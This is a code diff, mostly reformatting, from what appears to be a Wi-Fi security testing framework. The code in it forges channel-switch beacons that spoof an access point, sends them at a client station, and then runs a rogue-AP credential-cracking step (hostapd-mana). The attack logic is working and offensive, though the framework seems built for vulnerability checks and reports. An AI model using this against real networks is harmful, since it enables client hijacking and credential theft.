@@ -65,7 +65,7 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(!data.empty()) data[0] = static_cast<uint8_t>(ap_channel.ch_num);
 			o = Dot11::option(Dot11::OptionTypes::HT_OPERATION, data.size(), data.data());
-		/*} else if(id == static_cast<uint8_t>(Dot11::OptionTypes::RSN)) {
+			/*} else if(id == static_cast<uint8_t>(Dot11::OptionTypes::RSN)) {
 			//FIXME EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(data.size() >= 20) {
@@ -74,7 +74,7 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 			}
 			o = Dot11::option(static_cast<Dot11::OptionTypes>(48), data.size(), data.data());
 		*/
-		}else if(id == Dot11::OptionTypes::VHT_OP) {
+		} else if(id == Dot11::OptionTypes::VHT_OP) {
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(data.size() >= 3 && data[0] == 1) // 80 MHz: patch center channel
 				data[1] = vht_center_ch(ap_channel.ch_num);
@@ -142,8 +142,8 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 	return result;
 }
 
-RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel,
-		const Channel &new_channel, const int switch_count, const Dot11Beacon *src_beacon) {
+RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel, const Channel &new_channel,
+	const int switch_count, const Dot11Beacon *src_beacon) {
 	Dot11Beacon b = src_beacon ? *src_beacon : Dot11Beacon{};
 
 	Dot11ManagementFrame::channel_switch_type cs;
@@ -170,29 +170,30 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const Channel &ap_channel,
 }
 
 void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
-		const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
-		const int attack_time, const optional<string> &netns) {
+	const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
+	const int attack_time, const optional<string> &netns) {
 	netlink_helper::NetNSContext ns_ctx(netns);
 	PacketSender sender{ iface_name };
 	const auto end_time = steady_clock::now() + seconds(attack_time);
 
-	const unique_ptr<Dot11Beacon> beacon = scan::RSN_scan(iface_name, 20, ap_mac, nullopt, netns); //TODO hardcoded scan_timeout
+	const unique_ptr<Dot11Beacon> beacon =
+		scan::RSN_scan(iface_name, 20, ap_mac, nullopt, netns); //TODO hardcoded scan_timeout
 	if(!beacon) throw run_err("Not found beacon for reproduce");
 	log(LogLevel::INFO,
-			"check_vulnerable called with:\n"
-			"AP MAC: {}\n"
-			"STA MAC: {}\n"
-			"Interface: {}\n"
-			"Channel: {}\n"
-			"SSID: {}\n",
-			ap_mac,
-			sta_mac,
-			iface_name,
-			ap_channel.ch_num,
-			ssid);
+		"check_vulnerable called with:\n"
+		"AP MAC: {}\n"
+		"STA MAC: {}\n"
+		"Interface: {}\n"
+		"Channel: {}\n"
+		"SSID: {}\n",
+		ap_mac,
+		sta_mac,
+		iface_name,
+		ap_channel.ch_num,
+		ssid);
 
 	vector<RadioTap> frames;
-	for(int c =  CHANNEL_SWITCH_MAX; c >= 0; --c)
+	for(int c = CHANNEL_SWITCH_MAX; c >= 0; --c)
 		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()));
 
 	size_t idx = 0;
@@ -220,9 +221,7 @@ void run_attack(RunStatus &rs) {
 	const optional<string> netns = rs.get_actor("attacker")[SK::netns];
 	const string essid = ap.get(SK::ssid);
 	const Channel old_channel = ap->get_channel();
-	const Channel new_channel{
-		att_cfg.at("new_channel").get<uint8_t>(), ap->get_channel().band, ap[SK::ht_mode]
-	};
+	const Channel new_channel{ att_cfg.at("new_channel").get<uint8_t>(), ap->get_channel().band, ap[SK::ht_mode] };
 	const int ms_interval = att_cfg.at("ms_interval");
 	const int attack_time = att_cfg.at("attack_time");
 
@@ -239,7 +238,7 @@ void run_attack(RunStatus &rs) {
 }
 
 void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>> &elements,
-		const optional<hostapd::CrackResult> &crack_result) {
+	const optional<hostapd::CrackResult> &crack_result) {
 	report::ReportGuard report(rs.run_folder());
 	if(!report) return;
 
@@ -289,12 +288,12 @@ void stats_attack(const RunStatus &rs) {
 	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
 	rs.log_events(elements, { { "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue" } });
 
-	pcap_events(rs, elements, {
-		{ "attacker", "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac, "DISCONNECTED_att", "red" },
-		{ "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
-		{ "rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "blue" }
-	});
-	
+	pcap_events(rs,
+		elements,
+		{ { "attacker", "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac, "DISCONNECTED_att", "red" },
+			{ "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
+			{ "rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "blue" } });
+
 	auto [rogue_ap_connected, crack_result] = visual::helper::hostapd_mana_crack(rs, elements);
 	generate_report(rs, elements, crack_result);
 
